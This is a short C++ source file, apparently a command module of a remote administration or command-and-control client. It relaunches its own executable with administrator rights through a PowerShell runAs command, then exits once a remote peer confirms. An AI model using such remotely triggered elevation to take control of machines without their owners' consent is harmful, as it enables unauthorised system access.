#include "ElevateCommand.h"

int ElevateCommand::activate(Client* c, list<string> params) {
	LPSTR name = new CHAR[1024];
	if (GetModuleFileNameA(0, name, 1024) == 0)
		return -1;
	char* formatted = new CHAR[1024];
	sprintf_s(formatted, 1024, "powershell.exe -Command \"Start-Process \'%s\' -Verb runAs\"", name);
	printf_s("%s", formatted);
	system(formatted);
	char* response = c->recv_msg(256);
	if (strcmp(response, "TRUE") == 0) {
		// elevation succesful, terminate
		HANDLE hProcess = GetCurrentProcess();
		TerminateProcess(hProcess, 0);
		return 0;
	}
	else {
		return -1;
	}
}
